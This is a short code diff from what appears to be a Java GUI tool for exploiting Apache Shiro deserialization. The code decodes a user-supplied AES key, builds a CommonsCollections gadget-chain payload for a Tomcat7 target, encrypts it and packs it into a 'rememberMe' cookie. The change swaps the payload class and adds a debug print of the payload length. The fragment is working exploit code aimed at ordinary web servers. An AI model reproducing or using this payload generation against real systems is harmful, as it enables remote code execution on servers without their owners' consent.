@@ -108,7 +108,6 @@ public class Controller implements Initializable {
             }
         }
         else if(ShiroMiddlewareBox.getValue().equals("Tomcat7")){
-
             try {
                 //get input
                 byte[] key =java.util.Base64.getDecoder().decode(ShiroKeyField.getText());
@@ -122,9 +121,10 @@ public class Controller implements Initializable {
                     initPayload = "rememberMe=" + Base64.getEncoder().encodeToString(initciphertext.getBytes());
                 }
                 else {
-                    byte[] init = new CommonsCollectionsK1_1().getPayload(Init.class);
+                    byte[] init = new CommonsCollectionsK1_1().getPayload(T7.class);
                     byte[] initciphertext = AesUtils.encrypt(init, key);
                     initPayload = "rememberMe=" + Base64.getEncoder().encodeToString(initciphertext);
+                    System.out.println(initPayload.length());
                 }
 
 
